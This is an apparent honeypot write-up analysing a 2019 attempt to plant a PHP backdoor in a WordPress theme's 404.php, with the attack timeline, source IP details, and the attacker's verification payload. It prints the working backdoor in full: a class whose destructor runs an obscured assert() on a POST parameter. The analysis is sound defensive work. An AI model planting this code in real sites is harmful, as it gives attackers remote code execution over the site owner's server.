# Class Vone - Object Oriented Immediate Eval Backdoor

Installation of a backdoor with an
object-oriented method of evaluating PHP code.

## Origin

The attacker(s) tried to replace the `404.php` file of the "twentytwelve" WordPress theme with a backdoored version.

If you want to do this in a legit WordPress installation,
rather than the kind of hacky honey pot that I've written,
you have to log in to WordPress with an administrator ID.
The attackers tried to do that, failed a few times,
and proceeded to try to install the backdoor anyway.
My WordPress honey pot fakes a theme-editing function
and does not check for a valid login cookie to edit themes,
so it caught the theme edit.


|Timestamp | Action |
|----------------------------|-----------------|
|2019-09-03T07:19:56.180-0600|GET /wp-login.php|
|2019-09-03T07:19:56.179-0600|GET /wp-login.php|
|2019-09-03T07:19:56.179-0600|GET /wp-login.php|
|2019-09-03T07:19:56.287-0600|Send admin/admin888 login, honey pot rejects it|
|2019-09-03T07:19:56.287-0600|Send a2kgfn/a2kgfn@123.com login, honey pot rejects|
|2019-09-03T07:19:56.309-0600|Send admin/admin@1990 login, honey pot again rejects|
|2019-09-03T07:19:56.447-0600|GET /wp-admin/theme-editor.php, without login cookie|

Seven (7) requests in 0.267 seconds.
This has to be automated,
and poorly automated at that,
as it doesn't detect that it has failed the logins.
As we shall see futher down, this isn't the only shoddy programming going on.

### IP Address 192.99.15.141

192.99.15.141 has a DNS name of ns501343.ip-192-99-15.net

192.99.15.141 is an OVH IP address

    NetRange:       192.99.0.0 - 192.99.255.255
    CIDR:           192.99.0.0/16
    NetName:        OVH-ARIN-7
    NetHandle:      NET-192-99-0-0-1
    Parent:         NET192 (NET-192-0-0-0-0)
    OriginAS:       AS16276
    Organization:   OVH Hosting, Inc. (HO-2)
    RegDate:        2013-06-17
    Updated:        2013-06-17

This particular IP address is in Montreal, CA

#### Previous Accesses

A computer at 192.99.15.141 has made about 10 requests
of my website/honey pot between 2019-04-08 and 2019-04-17
before this particular attack.
They're all a little odd, asking for `//webconfig.txt.php`
or `/templates/system/css/system.css` or `/admin/images/cal_date_over.gif`.
I regard all of these as probing for weaknesses that might be present in a website.

## Analysis

### Deobfuscation

There's none of the usual obfuscation going on.
WordPress' theme editing doesn't really allow obfuscated
stuff in.
The back door involves 1 long line of PHP prepended to
the original twentytwelve theme's `404.php` file.

### The back door

Here's pretty-printed backdoor code:

    <?php
    class VONE
    {
        function HALB()
        {
            $rlf = 'B' ^ "#";
            $fzq = 'D' ^ "7";
            $fgu = 'h' ^ "\33";
            $sbe = 'R' ^ "7";
            $gba = 'H' ^ ":";
            $oya = 'Y' ^ "-";
            $MWUC = $rlf . $fzq . $fgu . $sbe . $gba . $oya;
            return $MWUC;
        }
        function __destruct()
        {
            $RNUJ = $this->HALB();
            @$RNUJ($this->HY);
        }
    }
    $vone = new VONE();
    @($vone->HY = isset($_GET['id']) ? base64_decode($_POST['mr6']) : $_POST['mr6']);

Object-oriented immediate evaluation.
I think OOD has gone way too far.

`function HALB` returns the string "assert".
The destructor function executes `assert()` on the value of the
instance variable `$this->HY`.
There's the evaluation:
`assert()` executed code passed in as a string argument in PHP 5.
An instance of `class Vone` can execute code when it's destructor gets invoked.
The function name "assert" is obscured, so without a little work,
you can't tell that code evaluation might go on.
If you're running PHP 5.x.

In practice, it looks like an attacker would send
a POST HTTP request with a parameter named "mr6" containing PHP.
If the URL invoked had "?id=something" appended,
it would Base64-decode the value of "mr6" parameter.

## Subsequent Accesses

192.99.15.141 tried to access the backdoored `404.php` file several times
after the installation attempt.


| Timestamp                  | URL                                   |
|----------------------------|---------------------------------------|
|2019-09-03T07:19:57.246-0600|/wp-content/themes/twentytwelve/404.php|
|2019-09-03T07:19:57.233-0600|/wp-content/themes/twentytwelve/404.php|
|2019-09-03T11:22:23.357-0600|/wp-content/themes/twentytwelve/404.php|
|2019-09-03T12:03:49.578-0600|/wp-content/themes/twentytwelve/404.php|
|2019-09-03T12:03:49.940-0600|/wp-content/themes/twentytwelve/404.php|
|2019-09-03T12:03:50.401-0600|/wp-content/themes/twentytwelve/404.php|
|2019-09-05T12:22:13.098-0600|/wp-content/themes/twentytwelve/404.php mr6|
|2019-09-05T12:22:15.312-0600|/wp-content/themes/twentytwelve/404.php mr6index.php|
|2019-09-05T12:22:17.927-0600|/wp-content/themes/twentytwelve/404.php mr6login_wall.php|

The first 6 accesses involved trying to send code to the object-oriented immediate eval backdoor.
It ended up the same code every time:

    @ini_set("display_errors","0");
    @set_time_limit(0);
    @set_magic_quotes_runtime(0);
    echo("->|");;
    echo "5cd56e39aabfa5ec95b14b888735b69b";;
    echo("|<-");
    die();

This looks like the attacker(s) tried to verify that the backdoor got
installed correctly, and that it's in working order.

The last 3 URLs aren't properly formatted, so it's hard to say
what was going on.
